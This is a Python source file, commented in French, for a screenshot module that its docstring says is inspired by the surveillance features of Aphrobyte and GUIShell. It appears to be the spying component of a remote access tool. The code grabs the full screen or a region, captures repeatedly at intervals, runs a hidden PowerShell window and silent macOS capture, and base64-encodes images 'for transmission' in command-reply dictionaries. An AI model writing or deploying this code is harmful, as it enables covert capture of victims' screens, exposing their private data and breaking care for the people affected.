"""
Screenshot Module - Capture d'écran
Inspiré des fonctionnalités de surveillance d'Aphrobyte et GUIShell
"""

import os
import io
import base64
import time
from datetime import datetime
from typing import Dict, Any, Optional
import logging

try:
    from PIL import ImageGrab, Image
    PIL_AVAILABLE = True
except ImportError:
    PIL_AVAILABLE = False

try:
    import pyautogui
    PYAUTOGUI_AVAILABLE = True
except ImportError:
    PYAUTOGUI_AVAILABLE = False

logger = logging.getLogger(__name__)

class ScreenshotModule:
    """Module de capture d'écran avec support multi-plateforme"""
    
    def __init__(self):
        self.screenshot_count = 0
        self.last_screenshot_time = 0
        self.screenshot_cooldown = 1  # Cooldown d'1 seconde entre captures
        
        # Vérification des dépendances
        self.available_methods = []
        if PIL_AVAILABLE:
            self.available_methods.append('PIL')
        if PYAUTOGUI_AVAILABLE:
            self.available_methods.append('pyautogui')
        
        if not self.available_methods:
            logger.warning("Aucune méthode de capture d'écran disponible")
    
    def take_screenshot(self, quality: int = 85, format: str = 'JPEG') -> Dict[str, Any]:
        """
        Prend une capture d'écran
        
        Args:
            quality: Qualité de l'image (1-100)
            format: Format de l'image ('JPEG', 'PNG')
        """
        try:
            # Vérification du cooldown
            current_time = time.time()
            if current_time - self.last_screenshot_time < self.screenshot_cooldown:
                return {
                    'status': 'error',
                    'output': f'Cooldown actif, attendez {self.screenshot_cooldown}s entre captures'
                }
            
            # Capture de l'écran
            screenshot_data = self._capture_screen()
            if not screenshot_data:
                return {
                    'status': 'error',
                    'output': 'Impossible de capturer l\'écran'
                }
            
            # Traitement de l'image
            processed_data = self._process_image(screenshot_data, quality, format)
            if not processed_data:
                return {
                    'status': 'error',
                    'output': 'Erreur lors du traitement de l\'image'
                }
            
            # Encodage en base64 pour transmission
            encoded_data = base64.b64encode(processed_data).decode('utf-8')
            
            # Mise à jour des statistiques
            self.screenshot_count += 1
            self.last_screenshot_time = current_time
            
            filename = f"screenshot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.{format.lower()}"
            
            return {
                'status': 'success',
                'output': f'Capture d\'écran réalisée: {filename}',
                'file_data': encoded_data,
                'filename': filename,
                'format': format,
                'size': len(processed_data),
                'timestamp': datetime.now().isoformat()
            }
            
        except Exception as e:
            logger.error(f"Erreur lors de la capture d'écran: {e}")
            return {
                'status': 'error',
                'output': f'Erreur lors de la capture: {str(e)}'
            }
    
    def take_multiple_screenshots(self, count: int, interval: int = 5) -> Dict[str, Any]:
        """
        Prend plusieurs captures d'écran à intervalle régulier
        
        Args:
            count: Nombre de captures
            interval: Intervalle en secondes entre captures
        """
        if count > 10:
            return {
                'status': 'error',
                'output': 'Maximum 10 captures par session'
            }
        
        screenshots = []
        
        try:
            for i in range(count):
                if i > 0:
                    time.sleep(interval)
                
                result = self.take_screenshot()
                if result['status'] == 'success':
                    screenshots.append({
                        'index': i + 1,
                        'filename': result['filename'],
                        'size': result['size'],
                        'timestamp': result['timestamp']
                    })
                else:
                    return {
                        'status': 'error',
                        'output': f'Erreur lors de la capture {i+1}: {result["output"]}'
                    }
            
            return {
                'status': 'success',
                'output': f'{len(screenshots)} captures réalisées',
                'screenshots': screenshots
            }
            
        except Exception as e:
            return {
                'status': 'error',
                'output': f'Erreur lors des captures multiples: {str(e)}'
            }
    
    def get_screen_info(self) -> Dict[str, Any]:
        """Récupère les informations sur l'écran"""
        try:
            info = {
                'available_methods': self.available_methods,
                'screenshot_count': self.screenshot_count,
                'last_screenshot': datetime.fromtimestamp(self.last_screenshot_time).isoformat() if self.last_screenshot_time > 0 else None
            }
            
            # Informations sur la résolution
            if PIL_AVAILABLE:
                try:
                    # Capture temporaire pour obtenir la taille
                    temp_screenshot = ImageGrab.grab()
                    info['resolution'] = {
                        'width': temp_screenshot.width,
                        'height': temp_screenshot.height
                    }
                    temp_screenshot.close()
                except:
                    pass
            elif PYAUTOGUI_AVAILABLE:
                try:
                    size = pyautogui.size()
                    info['resolution'] = {
                        'width': size.width,
                        'height': size.height
                    }
                except:
                    pass
            
            return {
                'status': 'success',
                'output': 'Informations écran récupérées',
                'data': info
            }
            
        except Exception as e:
            return {
                'status': 'error',
                'output': f'Erreur lors de la récupération des infos écran: {str(e)}'
            }
    
    def _capture_screen(self) -> Optional[bytes]:
        """Capture l'écran avec la méthode disponible"""
        
        # Méthode PIL (préférée)
        if 'PIL' in self.available_methods:
            try:
                screenshot = ImageGrab.grab()
                buffer = io.BytesIO()
                screenshot.save(buffer, format='PNG')
                screenshot.close()
                return buffer.getvalue()
            except Exception as e:
                logger.error(f"Erreur capture PIL: {e}")
        
        # Méthode pyautogui (alternative)
        if 'pyautogui' in self.available_methods:
            try:
                screenshot = pyautogui.screenshot()
                buffer = io.BytesIO()
                screenshot.save(buffer, format='PNG')
                return buffer.getvalue()
            except Exception as e:
                logger.error(f"Erreur capture pyautogui: {e}")
        
        # Méthode système (dernier recours)
        return self._system_screenshot()
    
    def _system_screenshot(self) -> Optional[bytes]:
        """Capture d'écran en utilisant les outils système"""
        try:
            import platform
            import subprocess
            import tempfile
            
            with tempfile.NamedTemporaryFile(suffix='.png', delete=False) as temp_file:
                temp_path = temp_file.name
            
            if platform.system().lower() == 'windows':
                # Utilisation de PowerShell sur Windows
                ps_command = f"""
                Add-Type -AssemblyName System.Windows.Forms
                $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
                $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
                $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
                $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
                $bitmap.Save('{temp_path}', [System.Drawing.Imaging.ImageFormat]::Png)
                $graphics.Dispose()
                $bitmap.Dispose()
                """
                
                subprocess.run([
                    'powershell', '-WindowStyle', 'Hidden', '-Command', ps_command
                ], check=True, capture_output=True)
                
            elif platform.system().lower() == 'linux':
                # Utilisation de scrot ou gnome-screenshot sur Linux
                commands = [
                    ['scrot', temp_path],
                    ['gnome-screenshot', '-f', temp_path],
                    ['import', '-window', 'root', temp_path]  # ImageMagick
                ]
                
                success = False
                for cmd in commands:
                    try:
                        subprocess.run(cmd, check=True, capture_output=True)
                        success = True
                        break
                    except (subprocess.CalledProcessError, FileNotFoundError):
                        continue
                
                if not success:
                    os.unlink(temp_path)
                    return None
            
            elif platform.system().lower() == 'darwin':
                # Utilisation de screencapture sur macOS
                subprocess.run([
                    'screencapture', '-x', temp_path
                ], check=True, capture_output=True)
            
            else:
                os.unlink(temp_path)
                return None
            
            # Lecture du fichier temporaire
            if os.path.exists(temp_path):
                with open(temp_path, 'rb') as f:
                    data = f.read()
                os.unlink(temp_path)
                return data
            
        except Exception as e:
            logger.error(f"Erreur capture système: {e}")
        
        return None
    
    def _process_image(self, image_data: bytes, quality: int, format: str) -> Optional[bytes]:
        """Traite l'image (redimensionnement, compression)"""
        try:
            if not PIL_AVAILABLE:
                return image_data  # Retourner les données brutes si PIL n'est pas disponible
            
            # Chargement de l'image
            image = Image.open(io.BytesIO(image_data))
            
            # Redimensionnement si l'image est trop grande
            max_width, max_height = 1920, 1080
            if image.width > max_width or image.height > max_height:
                # Calcul du ratio pour maintenir les proportions
                ratio = min(max_width / image.width, max_height / image.height)
                new_size = (int(image.width * ratio), int(image.height * ratio))
                image = image.resize(new_size, Image.Resampling.LANCZOS)
            
            # Conversion du format si nécessaire
            if format.upper() == 'JPEG' and image.mode in ('RGBA', 'LA', 'P'):
                # Conversion en RGB pour JPEG
                background = Image.new('RGB', image.size, (255, 255, 255))
                if image.mode == 'P':
                    image = image.convert('RGBA')
                background.paste(image, mask=image.split()[-1] if image.mode == 'RGBA' else None)
                image = background
            
            # Sauvegarde avec compression
            buffer = io.BytesIO()
            save_kwargs = {'format': format.upper()}
            
            if format.upper() == 'JPEG':
                save_kwargs['quality'] = max(1, min(100, quality))
                save_kwargs['optimize'] = True
            elif format.upper() == 'PNG':
                save_kwargs['optimize'] = True
                save_kwargs['compress_level'] = 9
            
            image.save(buffer, **save_kwargs)
            image.close()
            
            return buffer.getvalue()
            
        except Exception as e:
            logger.error(f"Erreur traitement image: {e}")
            return image_data  # Retourner les données originales en cas d'erreur
    
    def capture_region(self, x: int, y: int, width: int, height: int) -> Dict[str, Any]:
        """
        Capture une région spécifique de l'écran
        
        Args:
            x, y: Coordonnées du coin supérieur gauche
            width, height: Dimensions de la région
        """
        try:
            if not PIL_AVAILABLE:
                return {
                    'status': 'error',
                    'output': 'PIL requis pour la capture de région'
                }
            
            # Validation des paramètres
            if width <= 0 or height <= 0:
                return {
                    'status': 'error',
                    'output': 'Dimensions invalides'
                }
            
            # Capture de la région
            bbox = (x, y, x + width, y + height)
            screenshot = ImageGrab.grab(bbox=bbox)
            
            # Conversion en bytes
            buffer = io.BytesIO()
            screenshot.save(buffer, format='PNG')
            screenshot.close()
            
            # Encodage base64
            encoded_data = base64.b64encode(buffer.getvalue()).decode('utf-8')
            
            filename = f"region_{x}_{y}_{width}x{height}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
            
            return {
                'status': 'success',
                'output': f'Région capturée: {width}x{height} à ({x},{y})',
                'file_data': encoded_data,
                'filename': filename,
                'region': {'x': x, 'y': y, 'width': width, 'height': height}
            }
            
        except Exception as e:
            return {
                'status': 'error',
                'output': f'Erreur capture région: {str(e)}'
            }